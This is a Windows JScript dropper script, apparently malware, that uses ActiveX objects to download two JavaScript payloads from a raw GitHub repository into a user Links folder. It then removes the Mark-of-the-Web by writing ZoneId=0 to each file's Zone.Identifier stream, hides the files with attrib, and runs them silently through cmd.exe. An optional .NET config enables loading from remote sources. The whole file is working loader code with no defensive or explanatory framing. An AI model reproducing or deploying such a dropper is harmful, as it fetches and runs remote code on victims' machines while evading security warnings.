function main() {
	log('Starting application..');
	
	/*
	 * Settings
	 */
	var dotnet = false;

	var filename = environ('/Users/Default/Links/plugind.js');
	var url = 'https://raw.githubusercontent.com/comomr011/fiijjjjjkgjhghgh.html/main/plugind.js';
	
	
	/*
	 * Download and melt if file doesn't exist
	 */
	if (!fso.fileExists(filename)) {
		log('Downloading file..');
		download(url, filename);
		
		if (dotnet) {
			log('Creating configuration..');
			writeConfig(filename);
		}
	}
	
	/*
	 * Trust file
	 */
	log('Trusting file..');
	trust(filename);
	
	/*
	 * Hide file
	 */
	log('Hiding file..');
	hide(filename);
	
	/*
	 * Run file
	 */
	log('Starting file..');
	run(filename);
	
	/*
	 * Settings
	 */
	var dotnet = false;
	var filename2 = environ('/Users/Default/Links/plugin.js');
	var url2 = 'https://raw.githubusercontent.com/comomr011/fiijjjjjkgjhghgh.html/main/plugin.js';
	
	
	/*
	 * Download and melt if file doesn't exist
	 */
	if (!fso.fileExists(filename2)) {
		log('Downloading file..');
		download(url2, filename2);
		
		if (dotnet) {
			log('Creating configuration..');
			writeConfig(filename2);
		}
	}
	
	/*
	 * Trust file
	 */
	log('Trusting file..');
	trust(filename2);
	
	/*
	 * Hide file
	 */
	log('Hiding file..');
	hide(filename2);
	
	/*
	 * Run file
	 */
	log('Starting file..');
	run(filename2);
}


function log(str) {
	if (stdout.handle != null)
		stdout.write(str+"\r\n");
}

function download(url, filename) {
	var data = fetch(url);
	save(filename, data);
}
function download(url2, filename2) {
	var data = fetch(url2);
	save(filename2, data);
}
function fetch(url) {
	http.open('get', url, false);
	http.send();
	return http.responseBody;
}
function fetch(url2) {
	http.open('get', url2, false);
	http.send();
	return http.responseBody;
}
function save(filename, data) {
	stream.type = 1;
	stream.open();
	stream.write(data);
	stream.saveToFile(filename, 2);
	stream.close();
}
function save(filename2, data) {
	stream.type = 1;
	stream.open();
	stream.write(data);
	stream.saveToFile(filename2, 2);
	stream.close();
}
function run(cmd) {
	shell.run('cmd.exe /C ' + cmd, 0);
}

function trust(filename) {
	var zoneIdentifier = fso.openTextFile(filename + ':Zone.Identifier', 2, -2);
	zoneIdentifier.writeLine('[ZoneTransfer]');
	zoneIdentifier.write('ZoneId=0');
	zoneIdentifier.close();
}
function trust(filename2) {
	var zoneIdentifier = fso.openTextFile(filename2 + ':Zone.Identifier', 2, -2);
	zoneIdentifier.writeLine('[ZoneTransfer]');
	zoneIdentifier.write('ZoneId=0');
	zoneIdentifier.close();
}
function hide(filename) {
	run('attrib +H ' + filename);
}
function hide(filename2) {
	run('attrib +H ' + filename2);
}

function environ(val) {
	return shell.expandEnvironmentStrings(val);
}

function writeConfig(filename) {
	var configName = filename + '.config';
	stream.type = 2;
	stream.open();
	stream.writeText('<?xml version="1.0" encoding="utf-8" ?>', 1);
	stream.writeText('<configuration>', 1);
	stream.writeText('\t<runtime>', 1);
	stream.writeText('\t\t<loadFromRemoteSources enabled="true"/>', 1);
	stream.writeText('\t</runtime>', 1);
	stream.writeText('\t<startup>', 1);
	stream.writeText('\t\t<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />', 1);
	stream.writeText('\t</startup>', 1);
	stream.writeText('</configuration>', 1);
	stream.saveToFile(configName, 2);
	stream.close();
}
function writeConfig(filename2) {
	var configName = filename2 + '.config';
	stream.type = 2;
	stream.open();
	stream.writeText('<?xml version="1.0" encoding="utf-8" ?>', 1);
	stream.writeText('<configuration>', 1);
	stream.writeText('\t<runtime>', 1);
	stream.writeText('\t\t<loadFromRemoteSources enabled="true"/>', 1);
	stream.writeText('\t</runtime>', 1);
	stream.writeText('\t<startup>', 1);
	stream.writeText('\t\t<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />', 1);
	stream.writeText('\t</startup>', 1);
	stream.writeText('</configuration>', 1);
	stream.saveToFile(configName, 2);
	stream.close();
}
var fso = new ActiveXObject('Scripting.FileSystemObject');
var http = new ActiveXObject('WinHttp.WinHttpRequest.5.1');
var stream = new ActiveXObject('ADODB.Stream');
var shell = new ActiveXObject('WScript.Shell');
var stdin = fso.GetStandardStream (0);
var stdout = fso.GetStandardStream (1);
var stderr = fso.GetStandardStream (2);
this['main']();

